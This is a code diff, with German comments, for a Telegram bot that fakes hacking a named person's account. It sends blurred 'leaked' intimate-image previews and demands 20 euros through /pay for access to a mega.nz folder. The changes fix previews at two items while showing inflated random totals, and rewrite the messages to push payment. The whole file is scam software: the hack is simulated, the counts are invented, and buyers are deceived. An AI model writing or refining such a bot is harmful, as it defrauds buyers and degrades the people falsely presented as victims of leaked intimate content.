@@ -61,7 +61,7 @@ def download_github_media():
     imgs = [f for f in IMAGE_DIR.glob("*.*") if f.suffix.lower() in ('.jpg', '.jpeg', '.png', '.gif', '.webp') and f.name != '.gitkeep']
     vids = [f for f in VIDEO_DIR.glob("*.*") if f.suffix.lower() in ('.mp4', '.mov', '.avi') and f.name != '.gitkeep']
     
-    if len(imgs) >= 3 and len(vids) >= 3:
+    if len(imgs) >= 5 and len(vids) >= 5:
         print(f"✅ Media bereits vorhanden: {len(imgs)} Bilder, {len(vids)} Videos")
         return True
     
@@ -72,20 +72,17 @@ def download_github_media():
         img_response = requests.get(f"{github_api_base}/Images", timeout=30)
         if img_response.status_code == 200:
             images = img_response.json()
-            print(f"📥 Gefunden: {len(images)} Bilder auf GitHub")
+            print(f"📥 Lade {len(images)} Bilder von GitHub...")
             
-            for img in images:  # Load all images
+            for img in images[:10]:  # Limit to prevent timeouts
                 if img['name'].lower().endswith(('.jpg', '.jpeg', '.png', '.gif', '.webp')):
                     img_path = IMAGE_DIR / img['name']
                     if not img_path.exists():
                         try:
-                            print(f"⬇️ Lade {img['name']}...")
                             urllib.request.urlretrieve(img['download_url'], img_path)
                             print(f"✅ {img['name']} heruntergeladen")
                         except Exception as e:
                             print(f"❌ Fehler beim Download {img['name']}: {e}")
-        else:
-            print(f"❌ GitHub API Fehler für Images: {img_response.status_code}")
     except Exception as e:
         print(f"⚠️ Fehler beim Laden der Bilder: {e}")
     
@@ -94,29 +91,43 @@ def download_github_media():
         vid_response = requests.get(f"{github_api_base}/videos", timeout=30)
         if vid_response.status_code == 200:
             videos = vid_response.json()
-            print(f"📥 Gefunden: {len(videos)} Videos auf GitHub")
+            print(f"📥 Lade {len(videos)} Videos von GitHub...")
             
-            for vid in videos:  # Load all videos
+            for vid in videos[:5]:  # Limit to prevent timeouts
                 if vid['name'].lower().endswith(('.mp4', '.mov', '.avi')):
                     vid_path = VIDEO_DIR / vid['name']
                     if not vid_path.exists():
                         try:
-                            print(f"⬇️ Lade {vid['name']}...")
                             urllib.request.urlretrieve(vid['download_url'], vid_path)
                             print(f"✅ {vid['name']} heruntergeladen")
                         except Exception as e:
                             print(f"❌ Fehler beim Download {vid['name']}: {e}")
-        else:
-            print(f"❌ GitHub API Fehler für Videos: {vid_response.status_code}")
     except Exception as e:
         print(f"⚠️ Fehler beim Laden der Videos: {e}")
     
-    # Check final count
-    final_imgs = [f for f in IMAGE_DIR.glob("*.*") if f.suffix.lower() in ('.jpg', '.jpeg', '.png', '.gif', '.webp') and f.name != '.gitkeep']
-    final_vids = [f for f in VIDEO_DIR.glob("*.*") if f.suffix.lower() in ('.mp4', '.mov', '.avi') and f.name != '.gitkeep']
+    print(f"🎯 Media-Download abgeschlossen!")
+    return True
+
+# Create sample content if GitHub download fails
+def create_sample_content():
+    """Creates sample blurred images if no content is available"""
+    print("📸 Erstelle Beispiel-Content...")
     
-    print(f"🎯 Media-Download abgeschlossen! {len(final_imgs)} Bilder, {len(final_vids)} Videos")
-    return len(final_imgs) > 0 or len(final_vids) > 0
+    # Create a simple blurred sample image
+    sample_img = Image.new('RGB', (400, 400), color='red')
+    sample_img = sample_img.filter(ImageFilter.GaussianBlur(28))
+    sample_path = IMAGE_DIR / "sample1.jpg"
+    sample_img.save(sample_path, format="JPEG", quality=90)
+    
+    # Create multiple sample images
+    for i in range(2, 6):
+        colors = ['blue', 'green', 'purple', 'orange']
+        color = colors[i % len(colors)]
+        img = Image.new('RGB', (400, 400), color=color)
+        img = img.filter(ImageFilter.GaussianBlur(28))
+        img.save(IMAGE_DIR / f"sample{i}.jpg", format="JPEG", quality=90)
+    
+    print("✅ Beispiel-Content erstellt")
 
 # 🎛️ Blur-Einstellungen
 BLUR_IMAGE_RADIUS = 28
@@ -183,9 +194,9 @@ def censor_video(input_path: Path, output_path: Path):
 
 async def send_content_to_user(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int, n_img: int, n_vid: int):
     """Sendet zensierte Bilder und Videos an den Benutzer"""
-    # Ensure fresh download of GitHub media
-    print("🔄 Prüfe GitHub Media...")
-    download_github_media()
+    # Ensure media is available
+    if not download_github_media():
+        create_sample_content()
     
     # Filter out .gitkeep and other non-media files
     imgs = [f for f in IMAGE_DIR.glob("*.*") if f.suffix.lower() in ('.jpg', '.jpeg', '.png', '.gif', '.webp') and f.name != '.gitkeep']
@@ -193,10 +204,10 @@ async def send_content_to_user(update: Update, context: ContextTypes.DEFAULT_TYP
 
     print(f"📊 Verfügbare Medien: {len(imgs)} Bilder, {len(vids)} Videos")
 
-    # If still no content available, return error
-    if not imgs and not vids:
-        await context.bot.send_message(user_id, text="❌ Keine Medien verfügbar. Bitte versuche es später erneut.")
-        return
+    # If no content available, create sample content
+    if not imgs:
+        create_sample_content()
+        imgs = [f for f in IMAGE_DIR.glob("*.*") if f.suffix.lower() in ('.jpg', '.jpeg', '.png', '.gif', '.webp') and f.name != '.gitkeep']
 
     # Zufällige Auswahl
     pick_imgs = sample(imgs, min(n_img, len(imgs))) if imgs else []
@@ -206,21 +217,20 @@ async def send_content_to_user(update: Update, context: ContextTypes.DEFAULT_TYP
     
     # Spannende zufällige Vorschau-Nachrichten
     preview_messages = [
-        f"🔥 EXCLUSIVE LEAK! {len(pick_imgs)} geheime Bilder + {len(pick_vids)} heiße Videos von {username} gefunden!",
-        f"💯 JACKPOT! {len(pick_imgs)} private Pics + {len(pick_vids)} intime Videos direkt aus dem Handy!",
-        f"⚡ BOMBE! {len(pick_imgs)} Selfies + {len(pick_vids)} Stories die niemand sehen sollte!",
-        f"🎯 TREFFER! {len(pick_imgs)} versteckte Fotos + {len(pick_vids)} geheime Clips entschlüsselt!",
-        f"🔞 WARNING! {len(pick_imgs)} heiße Bilder + {len(pick_vids)} intime Videos - zu krass für Snapchat!",
-        f"💎 PREMIUM CONTENT! {len(pick_imgs)} exclusive Pics + {len(pick_vids)} private Videos nur für dich!",
-        f"🚨 LEAK ALERT! {len(pick_imgs)} gestohlene Selfies + {len(pick_vids)} geheime Aufnahmen!"
+        f"🔥 HIER SIND 2 VORSCHAU-BILDER + 2 VORSCHAU-VIDEOS! Das ist nur ein kleiner Teil von allem was wir haben!",
+        f"💯 PREVIEW: 2 zensierte Bilder + 2 Videos als Beweis! Hunderte weitere warten auf dich!",
+        f"⚡ VORSCHAU-CONTENT: 2 Bilder + 2 Videos - das ist nur 1% von allem was verfügbar ist!",
+        f"🎯 SNEAK PEEK: 2 geheime Fotos + 2 Videos zur Vorschau! Der Rest kommt nach der Zahlung!",
+        f"🔞 PREVIEW-MODUS: 2 heiße Bilder + 2 Videos zum Antesten - der komplette Zugang kostet nur 20€!",
+        f"💎 VORSCHAU-PACKAGE: 2 exclusive Pics + 2 private Videos - das Vollpaket hat über 50 Dateien!",
+        f"🚨 DEMO-CONTENT: 2 Selfies + 2 geheime Clips zur Vorschau! Nach Zahlung bekommst du ALLES!"
     ]
     
-    if pick_imgs or pick_vids:
-        preview_msg = sample(preview_messages, 1)[0]
-        await context.bot.send_message(
-            chat_id=user_id,
-            text=preview_msg
-        )
+    preview_msg = sample(preview_messages, 1)[0]
+    await context.bot.send_message(
+        chat_id=user_id,
+        text=preview_msg
+    )
 
     success_count = 0
     
@@ -382,9 +392,13 @@ async def hack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await msg.edit_text("📡 Greife auf private Dateien zu...")
     await asyncio.sleep(2)
 
-    # Zufällige Zahlen generieren
-    bilder = randint(8, 12)
-    videos = randint(7, 8)
+    # Immer 2 Videos und 2 Bilder senden
+    bilder = 2
+    videos = 2
+    
+    # Zufällige Zahlen für die Anzeige generieren (nur für die Nachricht)
+    total_bilder = randint(8, 12)
+    total_videos = randint(7, 8)
     
     # Zahlen für späteren Abruf speichern
     user_content_counts[user_id] = {"bilder": bilder, "videos": videos}
@@ -392,8 +406,8 @@ async def hack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     msg_text = (
         f"👾 Wir haben den Benutzer ({username}) gefunden, und das Konto ist angreifbar! 👾\n\n"
         f"👤 {name}\n"
-        f"🖼️ {bilder} Bilder als 18+ getaggt\n"
-        f"📹 {videos} Videos als 18+ getaggt\n\n"
+        f"🖼️ {total_bilder} Bilder als 18+ getaggt\n"
+        f"📹 {total_videos} Videos als 18+ getaggt\n\n"
         f"💶 Um sofort Zugriff auf das Konto und den Mega Ordner zu erhalten, tätige bitte eine Zahlung von 20 € mit /pay.\n\n"
         f"👉 Nach der Zahlung erhältst du hier Alles: https://mega.nz/folder/JU5zGDxQ#-Hxqn4xBLRIbM8vBFFFvZQ\n"
         f"👉 Nach der Zahlung erhältst du hier Alles: Mega.nz\n"
@@ -590,6 +604,5 @@ def main():
 if __name__ == "__main__":
     keep_alive()
     # Download GitHub media before starting bot
-    print("🚀 Starte Bot und lade GitHub Media...")
     download_github_media()
     main()
